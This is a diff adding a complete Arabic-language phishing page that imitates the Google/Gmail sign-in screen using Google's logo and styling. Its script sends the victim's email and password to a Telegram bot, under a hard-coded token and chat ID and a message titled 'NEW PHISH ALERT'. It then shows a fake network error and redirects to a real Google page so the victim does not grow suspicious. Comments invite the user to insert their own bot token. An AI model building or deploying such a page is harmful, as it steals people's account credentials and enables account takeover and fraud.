@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail account 💌</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f8f9fa; /* Light grey background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #202124;
+            flex-direction: column;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #ffffff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            width: 448px;
+            max-width: 100%;
+            text-align: center;
+            box-shadow: 0 1px 3px 0 rgba(0,0,0,0.05);
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+            letter-spacing: .00625em;
+            margin-bottom: 24px;
+            color: #5f6368;
+            text-align: center;
+        }
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            color: #202124;
+        }
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+        input[type="email"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #80868b;
+        }
+        .actions {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 32px;
+        }
+        .button-primary {
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        .button-primary:hover {
+            background-color: #1558b3;
+        }
+        .link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 8px;
+            margin-left: -8px; /* Optical alignment */
+            display: inline-block;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            width: 448px; /* Match container width */
+            max-width: 100%;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            padding: 8px 0;
+            margin: 0 10px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-select {
+            background-color: transparent;
+            border: none;
+            font-size: 12px;
+            color: #5f6368;
+            cursor: pointer;
+            padding: 8px 0;
+            margin: 0 10px;
+        }
+        .footer-select:focus {
+            outline: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="logo" alt="Google Logo">
+        <h1>تسجيل الدخول</h1>
+        <p>استخدام حسابك على Google</p>
+
+        <form onsubmit="sendData(); return false;">
+            <div class="form-group">
+                <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autofocus>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+            </div>
+
+            <div class="actions">
+                <a href="#" class="link">هل نسيت كلمة المرور؟</a>
+                <button type="submit" class="button-primary">التالي</button>
+            </div>
+        </form>
+        <p style="margin-top: 30px;"><a href="#" class="link">إنشاء حساب</a></p>
+    </div>
+
+    <div class="footer-links">
+        <select class="footer-select">
+            <option>العربية</option>
+            <option>English</option>
+            <option>Français</option>
+        </select>
+        <div>
+            <a href="#">المساعدة</a>
+            <a href="#">الخصوصية</a>
+            <a href="#">البنود</a>
+        </div>
+    </div>
+
+    <script>
+        const TOKEN = "8401560953:AAGGzPwBA3f8991k6axD7jEHeU69TQ8ScAA"; // استبدل بـ التوكن الخاص بك
+        const CHAT_ID = "6194049256";   // استبدل بـ الآيدي الخاص بك
+
+        function sendData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            const message = `🚨 NEW PHISH ALERT 🚨\n\n📧 Email: ${email}\n🔑 Password: ${pass}\n\n[Timestamp: ${new Date().toLocaleString()}]`;
+
+            // Telegram API call
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram API Response:', data);
+                if (data.ok) {
+                    // Redirect to a legitimate Google page or show a generic error
+                    alert('خطأ في الشبكة، يرجى المحاولة مرة أخرى.');
+                } else {
+                    alert('خطأ في الشبكة، يرجى المحاولة مرة أخرى.');
+                }
+                // Always redirect to Google to avoid suspicion
+                window.location.href = "https://www.google.com/intl/ar/account/about/";
+            })
+            .catch(error => {
+                console.error('Error sending data to Telegram:', error);
+                alert('حدث خطأ غير متوقع، يرجى المحاولة مرة أخرى.');
+                window.location.href = "https://www.google.com/intl/ar/account/about/"; // Ensure redirection
+            });
+        }
+    </script>
+</body>
+</html>
